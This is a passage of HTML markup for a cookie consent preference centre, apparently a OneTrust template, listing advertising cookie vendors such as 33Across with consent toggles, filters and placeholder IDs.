                    L213.13,222.409z"></path></g></svg></div><h3 class="pc-back-button-text" id="vendors-list-title">Advertising Cookies</h3></a></div><div class="action-container"><div id="search-container"><input id="vendor-search-handler" aria-label="Vendor Search" type="text" placeholder="Search..." name="vendor-search-handler"> <svg width="30" height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110"><path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
              s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
              c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
              s-17-7.626-17-17S14.61,6,23.984,6z"></path></svg></div><div id="filter-container"><a id="filter-btn-handler" role="button" aria-label="Filter" href="javascript:void(0)"><svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="15" height="15" viewBox="0 0 402.577 402.577" style="enable-background:new 0 0 402.577 402.577;" xml:space="preserve"><title>Filter Button</title><g><path fill="#2c3643" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
                            c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
                            c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
                            C402.765,25.895,404.093,19.231,400.858,11.427z"></path></g></svg></a></div></div></nav><section id="vendor-list-content"><div class="ot-sdk-row"><div class="ot-sdk-column"><div id="select-all-container"><div class="ot-checkbox"><div class="leg-int-sel-all-hdr"><span class="consent-hdr">Consent</span> <span class="leg-int-hdr">Leg.Interest</span></div><!-- select all vendor leg.int toggle container --><div id="select-all-vendors-leg-input-container"><input id="select-all-vendor-leg-handler" class="ot-group-option-box" type="checkbox"> <label for="select-all-vendor-leg-handler"><span class="label-text">Select All Vendors</span></label></div><!-- select all vendor consent toggle container --><div id="select-all-vendors-input-container"><input id="select-all-vendor-groups-handler" class="ot-group-option-box" type="checkbox"> <label for="select-all-vendor-groups-handler"><span class="label-text">Select All Vendors</span></label></div><!-- Hosts select all input container --><div id="select-all-hosts-input-container"><input id="select-all-hosts-groups-handler" class="ot-group-option-box" type="checkbox"> <label for="select-all-hosts-groups-handler"><span class="label-text">Select All Hosts</span></label></div><div id="select-all-text-container"><p>Select All</p></div></div></div><ul id="hosts-list-container"><li class="host-item"><input type="checkbox" class="host-box" aria-expanded="false" role="button" ot-accordion="true" aria-label="33Across"><section class="accordion-header"><div class="ot-toggle-group"><!-- Checkbox --><div class="ot-checkbox ot-host-tgl"><input id="REPLACE-WITH-DYANMIC-HOST-ID" class="host-checkbox-handler ot-group-option-box" type="checkbox"> <label for="REPLACE-WITH-DYANMIC-HOST-ID"><span class="label-text">REPLACE-WITH-DYANMIC-HOST-ID</span></label></div><!-- Checkbox END --><div class="host-info"><h3 class="host-title">33Across</h3><h4 class="host-description">33Across</h4></div></div><div class="host-notice"><div class="third-party-cookies-container"><a class="third-party-cookie-notice host-view-cookies" href="javascript:void(0)" role="presentation" aria-hidden="true" tabindex="-1">View Third Party Cookies</a></div><div class="ot-arrow-container"><svg class="ot-arrow" x="0px" y="0px" width="10px" height="10px" viewBox="0 0 451.846 451.847" style="enable-background:new 0 0 451.846 451.847;" xml:space="preserve"><g><path fill="#7b7b7b" d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                        L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                        c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path></g></svg></div></div></section><div class="accordion-text"><div class="host-options"><!-- HOST LIST VIEW UPDATE *** --><ul class="host-option-group"><li class="vendor-host"><div class="cookie-name-container"><div>Name</div><div>cookie name</div></div></li></ul><!-- HOST LIST VIEW UPDATE END *** --></div></div></li></ul><ul id="vendors-list-container"><li><input type="checkbox" class="vendor-box" aria-expanded="false" role="button" aria-label="33Across"><section class="accordion-header"><div class="ot-toggle-group"><!-- Checkbox --><div class="ot-checkbox"><input id="REPLACE-WITH-DYANMIC-VENDOR-ID" class="vendor-checkbox-handler ot-group-option-box" type="checkbox"> <label for="REPLACE-WITH-DYANMIC-VENDOR-ID"><span class="label-text">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label></div><!-- Checkbox END --><div class="vendor-info"><h3 class="vendor-title">33Across</h3><div class="vendor-purposes"><p>3 Purposes</p></div></div></div><div class="vendor-notice"><div class="vendor-privacy-notice-container"><a class="vendor-privacy-notice" href="#">View Privacy Notice</a></div><div class="ot-arrow-container"><svg role="presentation" class="ot-arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="10px" height="10px" viewBox="0 0 451.846 451.847" style="enable-background:new 0 0 451.846 451.847;" xml:space="preserve"><g><path fill="#7b7b7b" d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                                    L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                                    c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path></g></svg></div></div></section><section class="accordion-header"><div class="vendor-info"><h3 class="vendor-title">33Across</h3><!-- purposes count --><div class="vendor-purposes"><p>3 Purposes</p></div><div class="vendor-privacy-notice-container"><a class="vendor-privacy-notice" href="#">View Privacy Notice</a></div></div><div class="ot-arrow-container"><svg role="presentation" class="ot-arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="10px" height="10px" viewBox="0 0 451.846 451.847" style="enable-background:new 0 0 451.846 451.847;" xml:space="preserve"><g><path fill="#7b7b7b" d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                                L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                                c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path></g></svg></div><div class="ot-toggle-group"><!-- Checkbox --><div class="ot-checkbox"><input id="REPLACE-WITH-DYANMIC-VENDOR-ID1" class="vendor-checkbox-handler ot-group-option-box" type="checkbox"> <label for="REPLACE-WITH-DYANMIC-VENDOR-ID1"><span class="label-text">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label></div><!-- Checkbox END --></div></section><div class="accordion-text"><div class="vendor-options"><!-- VENDOR PURPOSE UPDATE *** --><div class="vendor-purpose-groups"><!-- vendor purposes --><div class="vendor-option-purpose"><p>Consent Purposes</p></div><div class="vendor-consent-group"><p class="consent-category">Location Based Ads</p><p class="consent-status">Consent Allowed</p></div><!-- vendor legitimate interest purposes --><div class="vendor-option-purpose legitimate-interest"><p>Legitimate Interest Purposes</p></div><div class="vendor-consent-group legitimate-interest-group"><p class="consent-category">Personalize</p><a href="#" class="vendor-opt-out-handler"><div class="op-out-group"><span>Require Opt-Out</span> <svg x="0px" y="0px" width="15" height="15" viewBox="0 0 511.626 511.627" style="enable-background:new 0 0 511.626 511.627;" xml:space="preserve"><g fill="#1a73e8"><g><path d="M392.857,292.354h-18.274c-2.669,0-4.859,0.855-6.563,2.573c-1.718,1.708-2.573,3.897-2.573,6.563v91.361
                                      c0,12.563-4.47,23.315-13.415,32.262c-8.945,8.945-19.701,13.414-32.264,13.414H82.224c-12.562,0-23.317-4.469-32.264-13.414
                                      c-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562,4.471-23.313,13.417-32.259c8.947-8.947,19.702-13.418,32.264-13.418
                                      h200.994c2.669,0,4.859-0.859,6.57-2.57c1.711-1.713,2.566-3.9,2.566-6.567V82.221c0-2.662-0.855-4.853-2.566-6.563
                                      c-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648,0-42.016,8.042-58.102,24.125C8.042,113.297,0,132.665,0,155.313v237.542
                                      c0,22.647,8.042,42.018,24.123,58.095c16.086,16.084,35.454,24.13,58.102,24.13h237.543c22.647,0,42.017-8.046,58.101-24.13
                                      c16.085-16.077,24.127-35.447,24.127-58.095v-91.358c0-2.669-0.856-4.859-2.574-6.57
                                      C397.709,293.209,395.519,292.354,392.857,292.354z"></path><path d="M506.199,41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948,0-9.233,1.807-12.847,5.424
                                      c-3.617,3.615-5.428,7.898-5.428,12.847s1.811,9.233,5.428,12.85l50.247,50.248L198.424,304.067
                                      c-1.906,1.903-2.856,4.093-2.856,6.563c0,2.479,0.953,4.668,2.856,6.571l32.548,32.544c1.903,1.903,4.093,2.852,6.567,2.852
                                      s4.665-0.948,6.567-2.852l186.148-186.148l50.251,50.248c3.614,3.617,7.898,5.426,12.847,5.426s9.233-1.809,12.851-5.426
                                      c3.617-3.616,5.424-7.898,5.424-12.847V54.818C511.626,49.866,509.813,45.586,506.199,41.971z"></path></g></g></svg></div></a></div><!-- Vendor special purposes --><div class="vendor-option-purpose spl-purpose"><p>Special Purposes</p></div><div class="vendor-consent-group spl-purpose-grp"><p class="consent-category">Location Based Ads</p></div><!-- Vendor features --><div class="vendor-option-purpose vendor-feature"><p>Features</p></div><div class="vendor-consent-group vendor-feature-group"><p class="consent-category">Location Based Ads</p></div><!-- Vendor special features --><div class="vendor-option-purpose vendor-spl-feature"><p>Special Features</p></div><div class="vendor-consent-group vendor-spl-feature-grp"><p class="consent-category">Location Based Ads</p></div></div><!-- VENDOR PURPOSE UPDATE END *** --></div></div></li></ul></div></div></section></div><div id="ot-triangle"></div><section id="ot-filter-modal"><div id="ot-options"><div id="clear-filters-container"><a href="javascript:void(0)" id="clear-filters-handler" role="button"><p>Clear Filters</p></a></div><div class="ot-group-options"><div class="ot-group-option"><div class="ot-checkbox"><input id="storage-access-group" class="ot-group-option-box category-filter-handler" type="checkbox"> <label for="storage-access-group"><span>Information storage and access</span></label></div></div></div><button id="filter-apply-handler" class="ot-pill">Apply</button></div></section></section></div><!-- footer --><div class="ot-button-group-parent"><div class="ot-button-group"><button class="save-preference-btn-handler onetrust-close-btn-handler">Save settings</button>  </div><div class="ot-pc-footer-logo"><a class="powered-by-logo" href="#" target="_blank" rel="noopener" aria-label="Powered by One Trust" style="background-image: url(&quot;assets/poweredBy_ot_logo.svg&quot;)"></a></div></div></div></div></body></html>